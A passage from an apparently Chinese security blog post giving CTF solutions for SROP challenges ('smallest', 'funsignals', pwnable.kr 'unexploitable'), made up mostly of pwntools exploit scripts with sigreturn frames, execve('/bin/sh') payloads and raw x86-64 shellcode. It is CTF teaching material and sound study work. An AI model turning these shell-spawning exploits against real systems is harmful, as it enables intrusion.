class="line">payload2 += call_function(elf.got[&quot;read&quot;], 0, sh_addr, 0x200)</span><br><span class="line">payload2 += call_function(sh_addr+0x10, sh_addr, 0, 0)</span><br><span class="line">print len(payload2)</span><br><span class="line">payload3 = &quot;/bin/sh\x00&quot;.ljust(0x10, &quot;B&quot;)</span><br><span class="line">payload3 += p64(syscall_addr)</span><br><span class="line">payload3 = payload3.ljust(59, &quot;D&quot;)</span><br><span class="line"></span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.send(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="360-ichunqiu-smallest"><a href="#360-ichunqiu-smallest" class="headerlink" title="360/ichunqiu smallest"></a>360/ichunqiu smallest</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000B0 start           proc near               ; DATA XREF: LOAD:00000000004000180</span><br><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br></pre></td></tr></table></figure>
+<p>srop + mprotect + shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">__author__ = &apos;joker&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">r = process(&quot;./smallest&quot;)</span><br><span class="line"></span><br><span class="line">syscall_addr = 0x4000BE</span><br><span class="line">start_addr = 0x4000B0</span><br><span class="line"></span><br><span class="line"># leak ebp</span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(0x4000b3) #fill</span><br><span class="line">payload += p64(start_addr) #fill</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(&quot;joker&quot;)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">#write infor leak</span><br><span class="line">r.send(&quot;\xb3&quot;)#write 2 start_addr last byte</span><br><span class="line">data = r.recv(8)</span><br><span class="line">data = r.recv(8)</span><br><span class="line">stack_addr = u64(data)</span><br><span class="line"></span><br><span class="line">print hex(stack_addr)</span><br><span class="line"></span><br><span class="line"># srop</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = 0x300</span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += str(frame)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(&quot;joker&quot;)</span><br><span class="line">payload = p64(0x4000B3)#fill</span><br><span class="line">payload += p64(0x400000)#fill    # 0x4000XX</span><br><span class="line">payload = payload[:15]</span><br><span class="line">r.send(payload)#set rax=sys_rt_sigreturn</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_mprotect</span><br><span class="line">frame.rdi = (stack_addr&amp;0xfffffffffffff000)</span><br><span class="line">frame.rsi = 0x1000</span><br><span class="line">frame.rdx = 0x7</span><br><span class="line">frame.rsp = stack_addr + 0x108</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += str(frame)</span><br><span class="line">print &quot;length:&quot;, len(payload)</span><br><span class="line">payload += p64(stack_addr + 0x108 + 8)</span><br><span class="line">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span><br><span class="line">payload += &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;#shellcode</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(&quot;joker&quot;)</span><br><span class="line">payload = p64(0x4000B3)#fill</span><br><span class="line">payload += p64(0x400000)#fill</span><br><span class="line">payload = payload[:15]</span><br><span class="line">r.send(payload)#set rax=sys_rt_sigreturn</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>srop + execve</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">__author__ = &apos;joker&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">r = process(&quot;./smallest&quot;)</span><br><span class="line"></span><br><span class="line">syscall_addr = 0x4000BE</span><br><span class="line">start_addr = 0x4000B0</span><br><span class="line"></span><br><span class="line"># leak ebp</span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(0x4000b3) #fill</span><br><span class="line">payload += p64(start_addr) #fill</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(&quot;joker&quot;)</span><br><span class="line">#write infor leak</span><br><span class="line">r.send(&quot;\xb3&quot;)#write 2 start_addr last byte</span><br><span class="line">data = r.recv(8)</span><br><span class="line">data = r.recv(8)</span><br><span class="line">stack_addr = u64(data)</span><br><span class="line"></span><br><span class="line">print hex(stack_addr)</span><br><span class="line"></span><br><span class="line"># srop</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = 0x300</span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr # After sigreturn, the rip will be the one just behind the syscall_addr</span><br><span class="line">print str(frame)</span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)     # block1</span><br><span class="line">payload += str(frame)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(&quot;joker&quot;)</span><br><span class="line">payload = p64(0x4000B3) # 填充 block1,0x4000B3 and 0x4000BE is both ok,they will all call &quot;syscall&quot;</span><br><span class="line">payload += &quot;abcdefgh&quot; # fill    # 0x4000XX</span><br><span class="line">payload = payload[:15]</span><br><span class="line">r.send(payload)#set rax=sys_rt_sigreturn</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack_addr + 0x108# sh_addr</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)      # block2</span><br><span class="line">payload += str(frame)</span><br><span class="line">payload += &quot;/bin/sh\x00&quot;</span><br><span class="line">print &quot;length:&quot;, len(payload)</span><br><span class="line">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(&quot;joker&quot;)</span><br><span class="line">payload = p64(0x4000B3) #fill block2</span><br><span class="line">payload += &quot;abcdefgh&quot; #fill everything is ok, just used to fill 15 byte</span><br><span class="line">payload = payload[:15]</span><br><span class="line">r.send(payload)#set rax=sys_rt_sigreturn</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Backdoor-CTF"><a href="#Backdoor-CTF" class="headerlink" title="Backdoor CTF"></a>Backdoor CTF</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">shellcode:0000000010000000 _shellcode      segment byte public &apos;CODE&apos; use64</span><br><span class="line">.shellcode:0000000010000000                 assume cs:_shellcode</span><br><span class="line">.shellcode:0000000010000000                 ;org 10000000h</span><br><span class="line">.shellcode:0000000010000000                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">.shellcode:0000000010000000</span><br><span class="line">.shellcode:0000000010000000                 public _start</span><br><span class="line">.shellcode:0000000010000000 _start:                                 ; Alternative name is &apos;_start&apos;</span><br><span class="line">.shellcode:0000000010000000                 xor     eax, eax        ; __start</span><br><span class="line">.shellcode:0000000010000002                 xor     edi, edi</span><br><span class="line">.shellcode:0000000010000004                 xor     edx, edx</span><br><span class="line">.shellcode:0000000010000006                 mov     dh, 4</span><br><span class="line">.shellcode:0000000010000008                 mov     rsi, rsp</span><br><span class="line">.shellcode:000000001000000B                 syscall                 ; LINUX - sys_read</span><br><span class="line">.shellcode:000000001000000D                 xor     edi, edi</span><br><span class="line">.shellcode:000000001000000F                 push    0Fh</span><br><span class="line">.shellcode:0000000010000011                 pop     rax</span><br><span class="line">.shellcode:0000000010000012                 syscall                 ; LINUX - sys_rt_sigreturn</span><br><span class="line">.shellcode:0000000010000014                 int     3               ; Trap to Debugger</span><br><span class="line">.shellcode:0000000010000015</span><br><span class="line">.shellcode:0000000010000015 syscall:                                ; LINUX -</span><br><span class="line">.shellcode:0000000010000015                 syscall</span><br><span class="line">.shellcode:0000000010000017                 xor     rdi, rdi</span><br><span class="line">.shellcode:000000001000001A                 mov     rax, 3Ch</span><br><span class="line">.shellcode:0000000010000021                 syscall                 ; LINUX - sys_exit</span><br><span class="line">.shellcode:0000000010000021 ; ---------------------------------------------------------------------------</span><br><span class="line">.shellcode:0000000010000023 flag            db &apos;fake_flag_here_as_original_is_at_server&apos;,0</span><br><span class="line">.shellcode:0000000010000023 _shellcode      ends</span><br></pre></td></tr></table></figure>
+<p>srop + execve:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.update(os = &apos;linux&apos;, arch = &apos;amd64&apos;)</span><br><span class="line"></span><br><span class="line">syscall_addr = 0x1000000B</span><br><span class="line">new_rsp_addr = 0x10000058</span><br><span class="line">sigreturn_addr = 0x10000010d</span><br><span class="line"></span><br><span class="line">#io = remote(&apos;172.17.0.3&apos;, 10001)</span><br><span class="line">io = process(&quot;./funsignals&quot;)</span><br><span class="line">frameRead = SigreturnFrame()			#构造read的SROP栈，使用read读取后续代码到新栈，同时劫持rsp</span><br><span class="line">frameRead.rax = constants.SYS_read</span><br><span class="line">frameRead.rdi = 0</span><br><span class="line">frameRead.rsi = new_rsp_addr</span><br><span class="line">frameRead.rdx = 0x1000</span><br><span class="line">frameRead.rsp = new_rsp_addr</span><br><span class="line">frameRead.rip = syscall_addr     # after sigreturn ,the rip will be the one just behind syscall_addr 0x100000D</span><br><span class="line"></span><br><span class="line">payload = str(frameRead)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(3)</span><br><span class="line">attach(io)</span><br><span class="line"></span><br><span class="line">frameExecve = SigreturnFrame()			#新栈内容，sigreturn的实现为push 0xf; pop rax; syscall，所以&quot;/bin/sh\x00&quot;放在最后。SROP帧第一个寄存器为uc_flag，不会影响SYS_execve调用</span><br><span class="line">frameExecve.rax = constants.SYS_execve</span><br><span class="line">frameExecve.rdi = new_rsp_addr+len(str(frameRead))</span><br><span class="line">frameExecve.rsi = 0</span><br><span class="line">frameExecve.rdx = 0</span><br><span class="line">frameExecve.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = str(frameExecve)</span><br><span class="line">payload += &quot;/bin/sh\x00&quot;</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/59104/">https://www.tiandiwuji.top/posts/59104/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/59104/">November 4th 2018, 1:11:27 pm</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/49484/" title="hctf2018">
+                    <div class="nextTitle">hctf2018</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/54250/" title="house_of_roman">
+                    <div class="prevTitle">house_of_roman</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SROP"><span class="toc-number">1.</span> <span class="toc-text">SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-kr-unexploitable"><span class="toc-number">1.1.</span> <span class="toc-text">pwnable.kr-unexploitable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP-自主组装sig-frame"><span class="toc-number">1.1.1.</span> <span class="toc-text">SROP(自主组装sig_frame):</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP-调用SigreturnFrame"><span class="toc-number">1.1.2.</span> <span class="toc-text">SROP(调用SigreturnFrame())</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP"><span class="toc-number">1.1.3.</span> <span class="toc-text">ROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#360-ichunqiu-smallest"><span class="toc-number">1.2.</span> <span class="toc-text">360/ichunqiu smallest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backdoor-CTF"><span class="toc-number">1.3.</span> <span class="toc-text">Backdoor CTF</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 71
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
